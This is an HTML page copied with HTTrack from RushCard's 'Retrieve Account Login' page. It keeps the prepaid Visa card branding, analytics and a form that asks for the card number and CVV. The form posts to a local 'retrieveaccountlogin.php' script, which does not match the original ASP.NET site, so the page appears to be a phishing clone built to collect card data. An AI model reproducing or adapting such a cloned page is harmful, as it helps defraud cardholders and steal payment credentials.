...
<!-- Mirrored from usermanagement.rushcard.com/retrieveaccountlogin by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 02 May 2021 18:52:39 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Retrieve Account Login: Step 1 | RushCard: Prepaid Visa Card</title>
...
<script>
    ...
    digitalData = {
        page: {
            pageName: "rc:user_management:retrieveaccountlogin:home",
            brand: "rc",
            site: "user_management",
            channel: "retrieveaccountlogin",
...
<body id="RetrieveAccountLogin" itemscope itemtype="http://schema.org/WebPage">
    <div id="wrapper">
...
<div class="col-xs-12 col-lg-10 ">
    <h1>Retrieve Account Login: Step 1</h1>
    <section class="content-box">
        <div class="content">
            <div class="row">
                <div class="col-xs-12">
                    <h2>Retrieve Account Login</h2>
                    <h3>
                        Steps: <img src="Content/Images/Step1of3.png" alt="1 of 3"/>
                    </h3>
<form action="retrieveaccountlogin.php" id="RetrieveAccountLoginForm" method="post" role="form"><input name="__RequestVerificationToken" type="hidden" value="9DNb9DolS3RT6DLBj3VefpmGpt0EY_J2jrsz-UmC0G5LiN2Cz53nxaDwOLuJ-1nmnxQMlc5wS7Id5ELe8bjj3TYL9601" />

<div class="row">
    <div class="col-xs-12 col-sm-4">
        <div class="form-group">
            <label for="CardNumber">Card Number:</label>
            <input autocomplete="no" class="form-control" data-field-name="cardnumber" data-val="true" data-val-regex="Card number must be a valid 16 digit card number" data-val-regex-pattern="^((4\d{3})|(5[1-5]\d{2}))\d{12}$" data-val-required="Required" id="CardNumber" name="CardNumber" placeholder="Your 16-digit card number" tabindex="1" type="tel" value="" />
    ...
    <div class="col-xs-12 col-sm-3">
        <div class="form-group">
            ...
            <input autocomplete="no" class="form-control" data-field-name="cvv" data-val="true" data-val-regex="CVV must be 3 digits" data-val-regex-pattern="^\d{3}$" data-val-required="Required" id="Cvv" name="Cvv" placeholder="Your CVV" tabindex="2" type="password" />
